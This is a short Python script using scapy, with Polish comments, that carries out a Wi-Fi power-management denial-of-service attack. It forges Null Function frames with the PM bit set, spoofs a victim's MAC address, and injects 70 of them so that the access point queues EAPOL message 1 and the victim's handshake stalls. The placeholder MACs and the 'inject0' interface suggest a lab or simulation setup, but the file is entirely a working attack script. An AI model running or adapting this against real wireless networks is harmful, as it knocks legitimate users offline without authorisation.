from scapy.all import *

INTERFACE = "inject0"
AP_MAC = "02:00:00:00:00:00"
VICTIM_MAC = "02:00:00:00:01:00"


def build_null_frame_with_pm_bit():
    """Tworzy ramkę Null Function (Data, Subtype 4) z ustawionym bitem Power Management (PM)."""
    dot11 = Dot11(
        type=2, subtype=4,
        addr1=AP_MAC,
        addr2=VICTIM_MAC,
        addr3=AP_MAC,
    )
    # Ustawienie 'to-DS' i 'Pwr Mgt' (bit 4, 0b00010000)
    dot11.FCfield = 'to-DS'
    dot11.FCfield |= 0b00010000

    return RadioTap() / dot11


def pm_dos_attack():
    """Wstrzykuje ramki PM w krótkim odstępie czasu, aby zablokować EAPOL Msg 1."""

    print(f"--- ATTACKER: Starting PM-bit DoS attack on {VICTIM_MAC} ---")

    null_frame = build_null_frame_with_pm_bit()

    sendp(null_frame, iface=INTERFACE, count=70, inter=0.1, verbose=False)

    print("--- INJECTION COMPLETE. VICTIM SHOULD BE ASLEEP (QUEUING EAPOL MSG 1) ---")


if __name__ == "__main__":
    pm_dos_attack()
